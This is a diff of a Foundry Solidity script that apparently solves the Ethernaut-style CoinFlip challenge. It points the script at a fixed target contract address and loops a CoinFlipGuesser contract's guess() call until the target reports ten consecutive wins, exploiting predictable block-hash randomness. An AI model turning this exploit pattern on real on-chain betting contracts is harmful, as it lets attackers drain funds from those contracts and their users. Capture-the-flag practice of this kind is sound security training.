@@ -21,7 +21,7 @@ contract CoinFlipScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            target = CoinFlip(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = CoinFlip(0xDC54876a5f54456E0b4Bbe1F49Ac7FAce4EAf68d); //attach to an existing contract:0x0000000000000000000000000000000000000000
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -49,21 +49,14 @@ contract CoinFlipScript is Script {
 
         console.log("[Exploiting...]");
         
-        address guesserAdr = address(0xfC437D334b800a4FDBf7477E752c127916aF2b8D);
-        CoinFlipGuesser guesser;
-        if (guesserAdr == address(0)){
-            vm.broadcast(attacker);
-            guesser = new CoinFlipGuesser();
-        }else{
-            guesser = CoinFlipGuesser(guesserAdr);
-        }
+        vm.startBroadcast(attacker);
+        CoinFlipGuesser guesser = new CoinFlipGuesser();
         console.log("guesser : %s", address(guesser));
-        if (guesser.getHash() == guesser.lastHash()){
-            console.log("wait for the next block");
-        }else {
-            vm.broadcast(attacker);
+        while(target.consecutiveWins() < 10){
             guesser.guess(address(target));
-            console.log("wins : %s", target.consecutiveWins());
+            console.log("wins : %d", target.consecutiveWins());
+            vm.roll(block.number+1);
         }
+        vm.stopBroadcast();
     }
 }
